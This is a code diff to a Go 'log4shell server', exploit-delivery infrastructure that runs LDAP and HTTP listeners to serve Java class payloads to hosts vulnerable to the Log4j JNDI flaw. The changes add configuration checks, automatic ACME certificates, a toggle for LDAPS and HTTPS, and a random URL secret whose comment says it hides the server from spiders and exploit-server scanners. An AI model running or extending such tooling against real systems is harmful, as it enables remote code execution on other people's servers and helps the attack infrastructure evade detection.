@@ -7,6 +7,7 @@ import (
 	"log"
 	"net"
 	"net/http"
+	"os"
 	"sync"
 	"time"
 
@@ -18,16 +19,30 @@ import (
 type Config struct {
 	LogOut io.Writer
 
-	Hostname   string
+	// Hostname can be set IP address or domain name,
+	// If enable AutoCert, must set domain name.
+	Hostname string
+
+	// PayloadDir contains Java class files.
 	PayloadDir string
 
+	// about servers network and address.
 	HTTPNetwork string
 	HTTPAddress string
 	LDAPNetwork string
 	LDAPAddress string
 
+	// AutoCert is used to ACME client to sign
+	// certificate automatically, don't need to
+	// set EnableTLS true again.
+	AutoCert bool
+
+	// EnableTLS is used to enable ldaps and
+	// https server, must set TLS certificate.
 	EnableTLS bool
-	TLSCert   tls.Certificate
+
+	// TLSCert is used to for ldaps and https.
+	TLSCert tls.Certificate
 }
 
 // Server is used to create an exploit server that contain
@@ -36,6 +51,8 @@ type Config struct {
 type Server struct {
 	logger    *log.Logger
 	enableTLS bool
+
+	secret string
 
 	httpListener net.Listener
 	httpHandler  *httpHandler
@@ -51,18 +68,46 @@ type Server struct {
 
 // New is used to create a new log4shell server.
 func New(cfg *Config) (*Server, error) {
+	// check configuration
+	if cfg.LogOut == nil {
+		panic("log4shell: Config.LogOut can not be nil")
+	}
+	if cfg.Hostname == "" {
+		return nil, errors.New("empty host name")
+	}
+	fi, err := os.Stat(cfg.PayloadDir)
+	if err != nil {
+		return nil, errors.WithStack(err)
+	}
+	if !fi.IsDir() {
+		return nil, errors.Errorf("\"%s\" is not a directory", cfg.PayloadDir)
+	}
+
+	// set logger
 	logger := log.New(cfg.LogOut, "", log.LstdFlags)
 	ldapserver.Logger = logger
 
 	// initial tls config
 	var tlsConfig *tls.Config
-	if cfg.EnableTLS {
+	enableTLS := cfg.EnableTLS
+	if cfg.AutoCert {
+		// hostname must be a domain name
+		cert, err := autoSignCert(cfg.Hostname)
+		if err != nil {
+			return nil, err
+		}
+		tlsConfig = &tls.Config{
+			Certificates: []tls.Certificate{*cert},
+		}
+		enableTLS = true
+	} else if enableTLS {
 		tlsConfig = &tls.Config{
 			Certificates: []tls.Certificate{cfg.TLSCert},
 		}
 	}
 
-	// for generate random http handler
+	// generate random string and add it to the http handler
+	// for prevent some http spider or exploit server scanner
 	secret := randString(8)
 
 	// initialize http server
@@ -90,7 +135,7 @@ func New(cfg *Config) (*Server, error) {
 		return nil, errors.Wrap(err, "failed to create ldap listener")
 	}
 	var scheme string
-	if cfg.EnableTLS {
+	if enableTLS {
 		scheme = "https"
 	} else {
 		scheme = "http"
@@ -117,7 +162,8 @@ func New(cfg *Config) (*Server, error) {
 	// create log4shell server
 	server := Server{
 		logger:       logger,
-		enableTLS:    cfg.EnableTLS,
+		enableTLS:    enableTLS,
+		secret:       secret,
 		httpListener: httpListener,
 		httpHandler:  &httpHandler,
 		httpServer:   &httpServer,
@@ -134,6 +180,7 @@ func (srv *Server) Start() error {
 	defer srv.mu.Unlock()
 
 	errCh := make(chan error, 2)
+
 	// start http server
 	srv.wg.Add(1)
 	go func() {
@@ -182,6 +229,10 @@ func (srv *Server) Stop() error {
 	srv.mu.Lock()
 	defer srv.mu.Unlock()
 
+	// close ldap server
+	srv.ldapServer.Stop()
+	srv.logger.Println("[info]", "ldap server is stopped")
+
 	// close http server
 	err := srv.httpServer.Close()
 	if err != nil {
@@ -189,11 +240,12 @@ func (srv *Server) Stop() error {
 	}
 	srv.logger.Println("[info]", "http server is stopped")
 
-	// close ldap server
-	srv.ldapServer.Stop()
-	srv.logger.Println("[info]", "ldap server is stopped")
-
 	srv.wg.Wait()
 	srv.logger.Println("[info]", "log4shell server is stopped")
 	return nil
+}
+
+// Secret is used to get the generated secret about url.
+func (srv *Server) Secret() string {
+	return srv.secret
 }
